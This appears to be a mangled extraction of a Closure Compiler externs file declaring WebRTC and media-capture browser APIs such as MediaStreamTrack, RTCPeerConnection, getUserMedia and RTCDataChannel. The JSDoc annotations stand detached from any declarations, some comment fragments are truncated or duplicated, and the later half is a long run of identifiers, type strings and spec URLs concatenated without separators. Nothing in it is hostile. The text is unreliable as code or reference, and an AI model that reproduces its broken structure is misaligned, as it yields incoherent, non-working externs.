
 * @type {string}
 * @see https://crbug.com/653531
 * @see https://wicg.github.io/mst-content-hint/
 /**\n *  ... nt/\n */
 * @type {MediaStreamTrackState}
 * Read only.
 
 * Applies the specified set of constraints to the track, if any specified; or
 * if no constraints are specified, removes all constraints from the track.
 *
 * @param {MediaTrackConstraints=} constraints Constraints to apply to the
 *   track.
 * @return {!Promise<void>} A |Promise| that is resolved when the constraints
 *   have been applied, or rejected if there was an error applying the
 *   constraints.
 /**\n *  ... ts.\n */
 * @return {!MediaStreamTrack}
  @return {!MediaTrackCapabilities} /** @re ... ies} */ @return {!MediaTrackConstraints} /** @re ... nts} */ @return {!MediaTrackSettings} /** @re ... ngs} */
 * @typedef {{track: MediaStreamTrack}}
 /**\n *  ... k}}\n */
 * @param {string} type
 * @param {!MediaStreamTrackEventInit} eventInitDict
 * @constructor
 * @extends {Event}
 * @see https://www.w3.org/TR/mediacapture-streams/#mediastreamtrackevent
 
 * @type {!MediaStreamTrack}
 * @const
 
 * @param {!MediaStream|!Array<!MediaStreamTrack>=} streamOrTracks
 * @constructor
 * @implements {EventTarget}
 * @see https://www.w3.org/TR/mediacapture-streams/#mediastream
 /**\n *  ... eam\n */
 * @override
 /**\n * @override\n */
 * TODO(bemasc): Remove this property.
 * @deprecated
 * @type {string}
 * @const
 
 * @return {!Array<!MediaStreamTrack>}
 
 * @param {string} trackId
 * @return {MediaStreamTrack}
 
 * @param {!MediaStreamTrack} track
 * @return {undefined}
 
 * @return {!MediaStream}
 
 * @deprecated
 * @type {boolean}
 
 * @deprecated
 * @type {?function(!Event)}
 
 * @type {?function(!MediaStreamTrackEvent)}
 
 * @deprecated
 * TODO(bemasc): Remove this method once browsers have updated to
 * MediaStreamTrack.stop().
 * @return {undefined}
 
 * @type {function(new: MediaStream,
 *                 (!MediaStream|!Array<!MediaStreamTrack>)=)}
 
 * @typedef {{tone: string}}
 * @see https://www.w3.org/TR/webrtc/#dom-rtcdtmftonechangeeventinit
 
 * @param {string} type
 * @param {!RTCDTMFToneChangeEventInit} eventInitDict
 * @constructor
 * @extends {Event}
 * @see https://www.w3.org/TR/webrtc/#dom-rtcdtmftonechangeevent
 
 * @interface
 * @see https://www.w3.org/TR/webrtc/#rtcdtmfsender
 
 * @param {string} tones
 * @param {number=} opt_duration
 * @param {number=} opt_interToneGap
 /**\n *  ... Gap\n */
 * @type {?function(!RTCDTMFToneChangeEvent)}
 
 * @interface
 * @see https://www.w3.org/TR/webrtc/#rtcrtpsender-interface
 
 * @const {!RTCDTMFSender}
 
 * @const {!MediaStreamTrack}
 
 * @param {!MediaStreamTrack} track
 
 * @return {!Object}
 
 * @param {!Object} params
 * @return {!Promise<undefined>}
 
 * @interface
 * @see https://www.w3.org/TR/webrtc/#dom-rtcrtpcontributingsource
 
 * @type {?number}
 
 * @type {?Date}
 
 * @interface
 * @see https://www.w3.org/TR/webrtc/#rtcrtpreceiver-interface
 
 * @return {!Array<!RTCRtpContributingSource>}
 
 * @see https://www.w3.org/TR/webrtc/#dom-rtcrtptransceiverinit
 * @record
 
 * The direction of the `RTCRtpTransceiver`. Defaults to "sendrecv".
 * @type {?RTCRtpTransceiverDirection|undefined}
 
 * The streams to add to the tranceiver's sender.
 * @type {?Array<!MediaStream>|undefined}
 
 * @type {?Array<!RTCRtpEncodingParameters>|undefined}
 
 * @see https://www.w3.org/TR/webrtc/#dom-rtcrtpencodingparameters
 * @record
 
 * @type {?number|undefined}
 
 * Possible values are "disabled" and "enabled".
 * @type {?string|undefined}
 
 * @type {?boolean|undefined}
 
 * Possible values are "very-low", "low" (default), "medium", and "high".
 * @type {?string|undefined}
 
 * @type {?string|number}
 
 * @type {?number|number}
 
 * @interface
 * @see https://www.w3.org/TR/webrtc/#rtcrtptransceiver-interface
 
 * @const {?string}
 
 * @const {!RTCRtpTransceiverDirection}
 
 * @const {?RTCRtpTransceiverDirection}
 
 * @param {!RTCRtpTransceiverDirection} direction
 
 * @const {?RTCRtpSender}
 
 * @const {?RTCRtpReceiver}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-longrange
 * @record
 
 * @type {number|undefined}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-doublerange
 * @record
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainbooleanparameters
 * @record
 
 * @type {boolean|undefined}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindomstringparameters
 * @record
 
 * @type {string|Array<string>|undefined}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindoublerange
 * @record
 * @extends {DoubleRange}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainlongrange
 * @record
 * @extends {LongRange}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainboolean
 * @typedef {boolean|ConstrainBooleanParameters}
 /**\n *  ... rs}\n */
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindomString
 * @typedef {string|Array<string>|ConstrainDOMStringParameters}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindouble
 * @typedef {number|ConstrainDoubleRange}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainlong
 * @typedef {number|ConstrainLongRange}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-mediatrackconstraintset
 * @record
 * @private
 
 * @type {ConstrainBoolean|undefined}
 
 * @type {ConstrainDouble|undefined}
 
 * @type {ConstrainLong|undefined}
 
 * @type {ConstrainDOMString|undefined}
 
 * @record
 * @extends {MediaTrackConstraintSet}
 
 * @type {Array<!MediaTrackConstraintSet>|undefined}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#media-track-constraints
 * @record
 
 * @type {boolean|MediaTrackConstraints|undefined}
 
 * @see {http://dev.w3.org/2011/webrtc/editor/getusermedia.html#
 *     navigatorusermediaerror-and-navigatorusermediaerrorcallback}
 * @interface
 
 * @type {number}
 * @deprecated Removed from the standard and some browsers.
 * @const
  1 /** 1 */
 * @type {number}
 * @deprecated Removed from the standard and some browsers.
 * Read only.
 
 * @type {string}
 * Read only.
 
 * @type {?string}
 * Read only.
 
 * @param {MediaStreamConstraints} constraints A MediaStreamConstraints object.
 * @param {function(!MediaStream)} successCallback
 *     A NavigatorUserMediaSuccessCallback function.
 * @param {function(!NavigatorUserMediaError)=} errorCallback A
 *     NavigatorUserMediaErrorCallback function.
 * @see http://dev.w3.org/2011/webrtc/editor/getusermedia.html
 * @see https://www.w3.org/TR/mediacapture-streams/
 * @return {undefined}
 
 * @param {string} type
 * @param {!Object} eventInitDict
 * @constructor
 
 * @type {?MediaStream}
 * @const
 
 * @record
 * @see https://www.w3.org/TR/mediastream-recording/#dictdef-mediarecorderoptions
  @type {(string|undefined)}  @type {(number|undefined)} 
 * @see https://www.w3.org/TR/mediastream-recording/#mediarecorder-api
 * @param {!MediaStream} stream
 * @param {MediaRecorderOptions=} options
 * @implements {EventTarget}
 * @constructor
 
 * @type {!MediaStream}
 
 * @type {(function(!Event)|undefined)}
 
 * @param {number=} timeslice
 
 * @interface
 * @see https://w3c.github.io/mediacapture-image/##photosettings-section
 
 * @interface
 * @see https://w3c.github.io/mediacapture-image/##photocapabilities-section
 
 * @type {!MediaSettingsRange}
 * @const
 
 * @type {!Array<!string>}
 * @const
 
 * @see https://w3c.github.io/mediacapture-image/
 * @param {!MediaStreamTrack} videoTrack
 * @constructor
 
 * @param {!PhotoSettings=} photoSettings
 * @return {!Promise<!Blob>}
 /**\n *  ... b>}\n */
 * @return {!Promise<!PhotoCapabilities>}
 
 * @return {!Promise<!ImageBitmap>}
 /**\n *  ... p>}\n */
 * @see https://www.w3.org/TR/webrtc/#rtctrackevent
 * @param {string} type
 * @param {!Object} eventInitDict
 * @constructor
 
 * @type {?RTCRtpReceiver}
 * @const
 
 * @type {?MediaStreamTrack}
 * @const
 
 * @type {?Array<!MediaStream>}
 * @const
 
 * @type {?RTCRtpTransceiver}
 * @const
 
 * @typedef {string}
 * @see https://www.w3.org/TR/mediacapture-streams/#idl-def-MediaDeviceKind
 * In WebIDL this is an enum with values 'audioinput', 'audiooutput', and
 * 'videoinput', but there is no mechanism in Closure for describing a
 * specialization of the string type.
 
 * Possible values are "sendrecv", "sendonly", "recvonly", and "inactive".
 * @typedef {string}
 * @see https://www.w3.org/TR/webrtc/#dom-rtcrtptransceiverdirection
  @const {!MediaDeviceKind} /** @co ... ind} */
 * @interface
 * @extends {EventTarget}
 * @see https://www.w3.org/TR/mediacapture-streams/#mediadevices
 /**\n *  ... ces\n */
 * @return {!Promise<!Array<!MediaDeviceInfo>>}
 
 * @see https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia
 * @param {!MediaStreamConstraints} constraints
 * @return {!Promise<!MediaStream>}
 
 * @see https://w3c.github.io/mediacapture-main/#dom-mediadevices-getsupportedconstraints
 * @return {!MediaTrackSupportedConstraints}
  @const {!MediaDevices} /** @co ... ces} */
 * @typedef {string}
 * @see https://www.w3.org/TR/webrtc/#rtcsdptype
 * In WebIDL this is an enum with values 'offer', 'pranswer', and 'answer',
 * but there is no mechanism in Closure for describing a specialization of
 * the string type.
 
 * @param {!Object=} descriptionInitDict The RTCSessionDescriptionInit
 * dictionary.  This optional argument may have type
 * {type:RTCSdpType, sdp:string}, but neither of these keys are required to be
 * present, and other keys are ignored, so the closest Closure type is Object.
 * @constructor
 * @see https://www.w3.org/TR/webrtc/#rtcsessiondescription-class
 
 * @type {?RTCSdpType}
 * @see https://www.w3.org/TR/webrtc/#dom-rtcsessiondescription-type
 
 * @type {?string}
 * @see https://www.w3.org/TR/webrtc/#dom-rtcsessiondescription-sdp
 /**\n *  ... sdp\n */
 * TODO(bemasc): Remove this definition once it is removed from the browser.
 * @param {string} label The label index (audio/video/data -> 0,1,2)
 * @param {string} sdp The ICE candidate in SDP text form
 * @constructor
 
 * @type {?string}
  @record /** @record */ @type {?string|undefined} 
 * @param {!RTCIceCandidateInit=} candidateInitDict  The RTCIceCandidateInit dictionary.
 * @constructor
 * @see https://www.w3.org/TR/webrtc/#rtcicecandidate-interface
 
 * @typedef {{urls: string}|{urls: !Array<!string>}}
 * @private
 * @see https://www.w3.org/TR/webrtc/#rtciceserver-dictionary
 * This dictionary type also has an optional key {credential: ?string}.
 /**\n *  ... g}.\n */
 * @interface
 * @private
 
 * @type {string|!Array<!string>}
 
 * This type, and several below it, are constructed as unions between records
 *
 * @typedef {RTCIceServerRecord_|RTCIceServerInterface_}
 * @private
 
 * @typedef {{
 *   iceServers: !Array<!RTCIceServer>,
 *   sdpSemantics: (string|undefined)
 * }}
 * @private
 
 * @type {!Array<!RTCIceServer>}
 
 * Allows specifying the SDP semantics. Valid values are "plan-b" and
 * "unified-plan".
 *
 * @see {@link https://webrtc.org/web-apis/chrome/unified-plan/}
 * @type {string|undefined}
 
 * @typedef {RTCConfigurationRecord_|RTCConfigurationInterface_}
 /**\n *  ... e_}\n */
 * @typedef {function(!RTCSessionDescription)}
 
 * @typedef {function(string)}
 
 * @typedef {function()}
 
 * @typedef {string}
 
 * @type {RTCIceCandidate}
 * @const
  Note: The specification of RTCStats types is still under development.// Note ... opment. Declarations here will be updated and removed to follow the development of// Decl ... ment of modern browsers, breaking compatibility with older versions as they become// mode ...  become obsolete.// obsolete.
 * @type {Date}
 * @const
 
 * @return {!Array<!string>}
 
 * @deprecated
 * @type {RTCStatsReport}
 * @const
  Note: Below are Map like methods supported by WebRTC statistics// Note ... tistics specification-compliant RTCStatsReport. Currently only implemented by// spec ... nted by Mozilla.// Mozilla. See https://www.w3.org/TR/webrtc/#rtcstatsreport-object for definition.// See  ... nition.
 * @param {function(this:SCOPE, Object, string, MAP)} callback
 * @param {SCOPE=} opt_thisObj The value of "this" inside callback function.
 * @this {MAP}
 * @template MAP,SCOPE
 * @readonly
 /**\n *  ... nly\n */
 * @param {string} key
 * @return {Object}
 * @readonly
 
 * @return {!IteratorIterable<string>}
 * @readonly
 
 * TODO(bemasc): Remove this type once it is no longer in use.  It has already
 * been removed from the specification.
 * @typedef {RTCStatsReport}
 * @deprecated
 
 * @return {!Array<!RTCStatsReport>}
 
 * @typedef {function(!RTCStatsResponse, MediaStreamTrack=)}
 
 * This type is not yet standardized, so the properties here only represent
 * the current capabilities of libjingle (and hence Chromium).
 * TODO(bemasc): Add a link to the relevant standard once MediaConstraint has a
 * standard definition.
 *
 * @interface
 * @private
 
 * @type {?boolean}
 
 * TODO(bemasc): Make this type public once it is defined in a standard.
 *
 * @typedef {Object|MediaConstraintSetInterface_}
 * @private
 
 * @type {?MediaConstraintSet_}
 /**\n *  ... t_}\n */
 * @type {?Array<!MediaConstraintSet_>}
 /**\n *  ... _>}\n */
 * This type is used extensively in
 * {@see http://dev.w3.org/2011/webrtc/editor/webrtc.html} but is not yet
 * defined.
 *
 * @typedef {Object|MediaConstraintsInterface_}
 
 * An enumerated string type (RTCDataChannelState) with values:
 * "connecting", "open", "closing", and "closed".
 * @type {string}
 * Read only.
 
 * @type {number}
 * Read only.
 
 * @type {?function(!MessageEvent<*>)}
 
 * @param {string|!Blob|!ArrayBuffer|!ArrayBufferView} data
 * @return {undefined}
 
 * @constructor
 * @extends {Event}
 * @private
 
 * @type {!RTCDataChannel}
 * Read only.
 
 * @typedef {{reliable: boolean}}
 
 * @typedef {Object}
 * @property {boolean=} [ordered=true]
 * @property {number=} maxPacketLifeTime
 * @property {number=} maxRetransmits
 * @property {string=} [protocol=""]
 * @property {boolean=} [negotiated=false]
 * @property {number=} id
 * @property {string=} [priority='low']
 * see https://www.w3.org/TR/webrtc/#dom-rtcdatachannelinit for documentation
 * Type inconsistencies due to Closure limitations:
 * maxPacketLifeTime should be UnsignedShort
 * maxRetransmits should be UnsignedShort
 * protocol should be USVString
 * id should be UnsignedShort
 * In WebIDL priority is an enum with values 'very-low', 'low',
 * 'medium' and 'high', but there is no mechanism in Closure for describing
 * a specialization of the string type.
 
 * @typedef {RTCDataChannelInitInterface_|RTCDataChannelInitRecord_|RTCDataChannelInitDictionary_}
 /**\n *  ... y_}\n */
 * @typedef {{expires: number}}
 
 * @param {RTCConfiguration} configuration
 * @param {!MediaConstraints=} constraints
 * @constructor
 * @implements {EventTarget}
 
 * @param {Object} keygenAlgorithm
 * @return {Promise<RTCCertificate>}
  NB: Until closure annotations support overloading, many of the following// NB:  ... llowing functions take odd unions of parameter types.  This is to support the various// func ... various api differences between browsers.  Generally, returning a promise means you// api  ... ans you don't take callback function parameters and draw any further parameters// don' ... ameters forward, and vice versa.// forw ...  versa.
 * @param {(!RTCSessionDescriptionCallback|!MediaConstraints)=}
 *    successCallbackOrConstraints
 * @param {!RTCPeerConnectionErrorCallback=} errorCallback
 * @param {!MediaConstraints=} constraints
 * @return {!Promise<!RTCSessionDescription>|undefined}
 
 * @param {!RTCSessionDescription} description
 * @param {!RTCVoidCallback=} successCallback
 * @param {!RTCPeerConnectionErrorCallback=} errorCallback
 * @return {!Promise<!RTCSessionDescription>}
 
 * @type {?RTCSessionDescription}
 * Read only.
 
 * @type {RTCSignalingState}
 * Read only.
 
 * @param {?RTCConfiguration=} configuration
 * @param {?MediaConstraints=} constraints
 * @return {undefined}
 
 * Void in Chrome for now, a promise that you can then/catch in Firefox.
 * @param {!RTCIceCandidate} candidate
 * @param {!RTCVoidCallback=} successCallback
 * @param {!function(DOMException)=} errorCallback
 * @return {!Promise|undefined}
 
 * @type {!RTCIceGatheringState}
 * Read only.
 
 * @type {!RTCIceConnectionState}
 * Read only.
 
 * @return {!Array<!MediaStream>}
 
 * @param {string} streamId
 * @return {MediaStream}
 
 * @return {!Array<!RTCRtpSender>}
 
 * @return {!Array<!RTCRtpReceiver>}
 
 * @param {?string} label
 * @param {RTCDataChannelInit=} dataChannelDict
 * @return {!RTCDataChannel}
 /**\n *  ... el}\n */
 * @param {!MediaStream} stream
 * @param {!MediaConstraints=} constraints
 * @return {undefined}
 
 * @param {!MediaStream} stream
 * @return {undefined}
 
 * @param {!MediaStreamTrack} track
 * @param {!MediaStream} stream
 * @param {...MediaStream} var_args Additional streams.
 * @return {!RTCRtpSender}
 
 * @param {!MediaStreamTrack|string} trackOrKind
 * @param {?RTCRtpTransceiverInit=} init
 * @return {!RTCRtpTransceiver}
 
 * Returns the list of transceivers are currently attached to this peer.
 *
 * @return {!Array<!RTCRtpTransceiver>}
 
 * @return {!RTCConfiguration}
 
 * @param {!RTCConfiguration} configuration
 * @return {undefined}
 
 * @param {!RTCRtpSender} sender
 * @return {undefined}
  TODO(bemasc): Add identity provider stuff once implementations exist// TODO ... s exist TODO(rjogrady): Per w3c spec, getStats() should always return a Promise.// TODO ... romise. Remove RTCStatsReport from the return value once Firefox supports that.// Remo ... s that.
 * Firefox' getstats is synchronous and returns a much simpler
 * {!RTCStatsReport} Map-like object.
 * @param {!RTCStatsCallback=} successCallback
 * @param {MediaStreamTrack=} selector
 * @return {undefined|!RTCStatsReport|!Promise<!RTCStatsReport>}
 
 * @type {?function(!RTCPeerConnectionIceEvent)}
 
 * @type {?function(!MediaStreamEvent)}
 
 * @type {?function(!RTCTrackEvent)}
 
 * @type {?function(!RTCDataChannelEvent)}
 
 * @interface
 * @param {RTCIceGatherer} iceGatherer
 * @see https://www.w3.org/TR/webrtc/#idl-def-rtcicetransport
 
 * @type {!RTCIceGatheringState}
 * @const
 
 * @return {RTCIceCandidate[]}
 /**\n *  ... []}\n */
 * @return {RTCIceCandidatePair}
 
 * @return {RTCIceParameters}
 
 * @param {!Event} e
 * @return {undefined}
 
 * @constructor
 * @param {!RTCIceGatherOptions} options
 * @see https://msdn.microsoft.com/en-us/library/mt433107(v=vs.85).aspx
 
 * @interface
 * @param {RTCIceTransport} iceTransport
 * @see https://www.w3.org/TR/webrtc/#idl-def-rtcdtlstransport
 
 * @type {RTCIceTransport}
 * @const
 
 * @return {ArrayBuffer[]}
 MediaStreamTrackStateSourceInfofacingMediaSettingsRangeMediaTrackCapabilitiesaspectRatioframeRatefacingModesampleRatesampleSizeechoCancellationlatencychannelCountdeviceIdgroupIdwhiteBalanceModeexposureModefocusModeexposureCompensationcolorTemperatureisobrightnesscontrastsaturationsharpnesstorchMediaTrackSettingspointsOfInterestMediaTrackSupportedConstraintsautoGainControlnoiseSuppressionMediaStreamTrackgetSourcesenabledcontentHintremoteonmuteonunmuteonoverconstrainedapplyConstraintsconstraintsgetCapabilitiesgetConstraintsgetSettingsMediaStreamTrackEventInitMediaStreamTrackEventeventInitDictstreamOrTracksgetAudioTracksgetVideoTracksgetTrackstrackIdaddTrackremoveTrackonactiveoninactiveonaddtrackonremovetrackwebkitMediaStreamRTCDTMFToneChangeEventInitRTCDTMFToneChangeEventtoneRTCDTMFSenderinsertDTMFtonesopt_durationopt_interToneGapontonechangetoneBufferRTCRtpSendertransportdtmfreplaceTrackgetParameterssetParametersRTCRtpContributingSourceRTCRtpReceivergetContributingSourcesgetSynchronizationSourcesRTCRtpTransceiverInitstreamssendEncodingsRTCRtpEncodingParameterscodecPayloadTypedtxptimemaxBitratemaxFramerateridscaleResolutionDownByRTCRtpTransceivermidstoppedcurrentDirectionsetDirectionreceiverLongRangeDoubleRangeConstrainBooleanParametersexactidealConstrainDOMStringParametersConstrainDoubleRangeConstrainLongRangeConstrainBooleanConstrainDOMStringConstrainDoubleConstrainLongMediaTrackConstraintSetMediaTrackConstraintsadvancedMediaStreamConstraintsaudiovideoNavigatorUserMediaErrorconstraintNamewebkitGetUserMediaMediaStreamEventMediaRecorderOptionsaudioBitsPerSecondvideoBitsPerSecondbitsPerSecondMediaRecorderonstartonstoponresumetimeslicerequestDataPhotoSettingsfillLightModeimageHeightimageWidthredEyeReductionPhotoCapabilitiesImageCapturevideoTracktakePhotophotoSettingsgetPhotoCapabilitiesgrabFrameRTCTrackEventtransceiverMediaDeviceKindRTCRtpTransceiverDirectionMediaDeviceInfoMediaDevicesenumerateDevicesgetUserMediagetSupportedConstraintsmediaDevicesRTCSdpTypeRTCSessionDescriptiondescriptionInitDictsdpIceCandidatetoSdpRTCIceCandidateInitcandidatesdpMidsdpMLineIndexusernameFragmentRTCIceCandidatecandidateInitDictRTCIceServerRecord_RTCIceServerInterface_urlscredentialRTCIceServerRTCConfigurationRecord_RTCConfigurationInterface_iceServerssdpSemanticsRTCConfigurationRTCSessionDescriptionCallbackRTCPeerConnectionErrorCallbackRTCVoidCallbackRTCSignalingStateRTCIceConnectionStateRTCIceGatheringStateRTCPeerConnectionIceEventRTCStatsReportlocalopt_thisObjRTCStatsElementRTCStatsResponseRTCStatsCallbackMediaConstraintSetInterface_OfferToReceiveAudioOfferToReceiveVideoDtlsSrtpKeyAgreementRtpDataChannelsMediaConstraintSet_MediaConstraintsInterface_mandatoryoptionalMediaConstraintsRTCDataChannelreliableRTCDataChannelEventchannelRTCDataChannelInitRecord_RTCDataChannelInitInterface_RTCDataChannelInitDictionary_RTCDataChannelInitRTCCertificateRTCPeerConnectionconfigurationgenerateCertificatekeygenAlgorithmcreateOffersuccessCallbackOrConstraintscreateAnswersetLocalDescriptionsetRemoteDescriptionlocalDescriptionremoteDescriptionsignalingStateupdateIceaddIceCandidateiceGatheringStateiceConnectionStategetLocalStreamsgetRemoteStreamsgetStreamByIdstreamIdgetSendersgetReceiverscreateDataChanneldataChannelDictaddStreamremoveStreamaddTransceivertrackOrKindgetTransceiversgetConfigurationsetConfigurationgetStatsonnegotiationneededonicecandidateonsignalingstatechangeonaddstreamontrackonremovestreamoniceconnectionstatechangeondatachannelwebkitRTCPeerConnectionmozRTCPeerConnectionRTCIceTransporticeGatherergatheringStategetLocalCandidatesgetRemoteCandidatesgetSelectedCandidatePairgetLocalParametersgetRemoteParametersonstatechangeongatheringstatechangeonselectedcandidatepairchangeRTCIceGathererRTCDtlsTransporticeTransportgetRemoteCertificatesDefinitions for components of the WebRTC browser API.
https://www.w3.org/TR/webrtc/
https://tools.ietf.org/html/draft-ietf-rtcweb-jsep-19
https://developer.mozilla.org/en-US/docs/Web/API/WebRTC_API
https://www.w3.org/TR/mediacapture-streams/
*bemasc@google.com (Benjamin M. Schwartz){https://www.w3.org/TR/mediacapture-streams/
#idl-def-MediaStreamTrackState}
In WebIDL this is an enum with values 'live', 'mute', and 'ended',
but there is no mechanism in Closure for describing a specialization of
the string type.https://w3c.github.io/mediacapture-image/#mediasettingsrange-sectionhttps://www.w3.org/TR/mediacapture-streams/#idl-def-MediaTrackCapabilities
https://w3c.github.io/mediacapture-image/#mediatrackcapabilities-section!Array.<boolean>Array.<boolean>!MediaSettingsRangehttps://www.w3.org/TR/mediacapture-streams/#media-track-settings
https://w3c.github.io/mediacapture-image/#mediatracksettings-section!Array.<{x: number, y: number}>Array.<{x: number, y: number}>{x: number, y: number}https://w3c.github.io/mediacapture-main/#media-track-supported-constraintshttps://www.w3.org/TR/mediacapture-streams/#mediastreamtrack!function (!Array.<!SourceInfo>)function (!Array.<!SourceInfo>)!Array.<!SourceInfo>Array.<!SourceInfo>!SourceInfoUse MediaDevices.enumerateDevices().https://crbug.com/653531
https://wicg.github.io/mst-content-hint/Read only.Applies the specified set of constraints to the track, if any specified; or
if no constraints are specified, removes all constraints from the track.Constraints to apply to the
track.
MediaTrackConstraints=A |Promise| that is resolved when the constraints
have been applied, or rejected if there was an error applying the
constraints.!MediaStreamTrack!MediaTrackCapabilities!MediaTrackConstraints!MediaTrackSettings{track: MediaStreamTrack}!MediaStreamTrackEventInithttps://www.w3.org/TR/mediacapture-streams/#mediastreamtrackevent(!MediaStream|!Array.<!MediaStreamTrack>)=(!MediaStream|!Array.<!MediaStreamTrack>)!Array.<!MediaStreamTrack>Array.<!MediaStreamTrack>https://www.w3.org/TR/mediacapture-streams/#mediastreamTODO(bemasc): Remove this property.?function (!MediaStreamTrackEvent)function (!MediaStreamTrackEvent)!MediaStreamTrackEventTODO(bemasc): Remove this method once browsers have updated to
MediaStreamTrack.stop().
function (new: MediaStream, (!MediaStream|!Array.<!MediaStreamTrack>)=){tone: string}https://www.w3.org/TR/webrtc/#dom-rtcdtmftonechangeeventinit!RTCDTMFToneChangeEventInithttps://www.w3.org/TR/webrtc/#dom-rtcdtmftonechangeeventhttps://www.w3.org/TR/webrtc/#rtcdtmfsender?function (!RTCDTMFToneChangeEvent)function (!RTCDTMFToneChangeEvent)!RTCDTMFToneChangeEventhttps://www.w3.org/TR/webrtc/#rtcrtpsender-interface!RTCDTMFSenderhttps://www.w3.org/TR/webrtc/#dom-rtcrtpcontributingsource?Datehttps://www.w3.org/TR/webrtc/#rtcrtpreceiver-interface!Array.<!RTCRtpContributingSource>Array.<!RTCRtpContributingSource>!RTCRtpContributingSourcehttps://www.w3.org/TR/webrtc/#dom-rtcrtptransceiverinit
The direction of the `RTCRtpTransceiver`. Defaults to "sendrecv".(?RTCRtpTransceiverDirection|undefined)?RTCRtpTransceiverDirectionThe streams to add to the tranceiver's sender.(?Array.<!MediaStream>|undefined)?Array.<!MediaStream>Array.<!MediaStream>(?Array.<!RTCRtpEncodingParameters>|undefined)?Array.<!RTCRtpEncodingParameters>Array.<!RTCRtpEncodingParameters>!RTCRtpEncodingParametershttps://www.w3.org/TR/webrtc/#dom-rtcrtpencodingparameters
Possible values are "disabled" and "enabled".Possible values are "very-low", "low" (default), "medium", and "high".(?string|number)(?number|number)https://www.w3.org/TR/webrtc/#rtcrtptransceiver-interface!RTCRtpTransceiverDirection?RTCRtpSender?RTCRtpReceiverhttps://w3c.github.io/mediacapture-main/getusermedia.html#dom-longrange
https://w3c.github.io/mediacapture-main/getusermedia.html#dom-doublerange
https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainbooleanparameters
https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindomstringparameters
(string|Array.<string>|undefined)https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindoublerange
https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainlongrange
https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainboolean
(boolean|ConstrainBooleanParameters)https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindomString
(string|Array.<string>|ConstrainDOMStringParameters)https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindouble
(number|ConstrainDoubleRange)https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainlong
(number|ConstrainLongRange)https://w3c.github.io/mediacapture-main/getusermedia.html#dom-mediatrackconstraintset
(ConstrainBoolean|undefined)(ConstrainDouble|undefined)(ConstrainLong|undefined)(ConstrainDOMString|undefined)(Array.<!MediaTrackConstraintSet>|undefined)Array.<!MediaTrackConstraintSet>!MediaTrackConstraintSethttps://w3c.github.io/mediacapture-main/getusermedia.html#media-track-constraints
(boolean|MediaTrackConstraints|undefined){http://dev.w3.org/2011/webrtc/editor/getusermedia.html#
navigatorusermediaerror-and-navigatorusermediaerrorcallback}
Removed from the standard and some browsers.
Removed from the standard and some browsers.
Read only.A MediaStreamConstraints object.
A NavigatorUserMediaSuccessCallback function.
function (!MediaStream)A
NavigatorUserMediaErrorCallback function.
function (!NavigatorUserMediaError)=function (!NavigatorUserMediaError)!NavigatorUserMediaErrorhttp://dev.w3.org/2011/webrtc/editor/getusermedia.html
https://www.w3.org/TR/mediacapture-streams/
?MediaStreamhttps://www.w3.org/TR/mediastream-recording/#dictdef-mediarecorderoptionshttps://www.w3.org/TR/mediastream-recording/#mediarecorder-api
MediaRecorderOptions=(function (!Event)|undefined)https://w3c.github.io/mediacapture-image/##photosettings-sectionhttps://w3c.github.io/mediacapture-image/##photocapabilities-section!Array.<!string>Array.<!string>https://w3c.github.io/mediacapture-image/
!PhotoSettings=!PhotoSettings!Promise.<!PhotoCapabilities>Promise.<!PhotoCapabilities>!PhotoCapabilities!Promise.<!ImageBitmap>Promise.<!ImageBitmap>!ImageBitmapImageBitmaphttps://www.w3.org/TR/webrtc/#rtctrackevent
?MediaStreamTrack?RTCRtpTransceiverhttps://www.w3.org/TR/mediacapture-streams/#idl-def-MediaDeviceKind
In WebIDL this is an enum with values 'audioinput', 'audiooutput', and
'videoinput', but there is no mechanism in Closure for describing a
specialization of the string type.Possible values are "sendrecv", "sendonly", "recvonly", and "inactive".https://www.w3.org/TR/webrtc/#dom-rtcrtptransceiverdirection!MediaDeviceKindhttps://www.w3.org/TR/mediacapture-streams/#mediadevices!Promise.<!Array.<!MediaDeviceInfo>>Promise.<!Array.<!MediaDeviceInfo>>!Array.<!MediaDeviceInfo>Array.<!MediaDeviceInfo>!MediaDeviceInfohttps://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia
!MediaStreamConstraints!Promise.<!MediaStream>Promise.<!MediaStream>https://w3c.github.io/mediacapture-main/#dom-mediadevices-getsupportedconstraints
!MediaTrackSupportedConstraints!MediaDeviceshttps://www.w3.org/TR/webrtc/#rtcsdptype
In WebIDL this is an enum with values 'offer', 'pranswer', and 'answer',
but there is no mechanism in Closure for describing a specialization of
the string type.The RTCSessionDescriptionInit
dictionary.  This optional argument may have type
{type:RTCSdpType, sdp:string}, but neither of these keys are required to be
present, and other keys are ignored, so the closest Closure type is Object.
https://www.w3.org/TR/webrtc/#rtcsessiondescription-class?RTCSdpTypehttps://www.w3.org/TR/webrtc/#dom-rtcsessiondescription-typehttps://www.w3.org/TR/webrtc/#dom-rtcsessiondescription-sdpTODO(bemasc): Remove this definition once it is removed from the browser.The label index (audio/video/data -> 0,1,2)
The ICE candidate in SDP text form
The RTCIceCandidateInit dictionary.
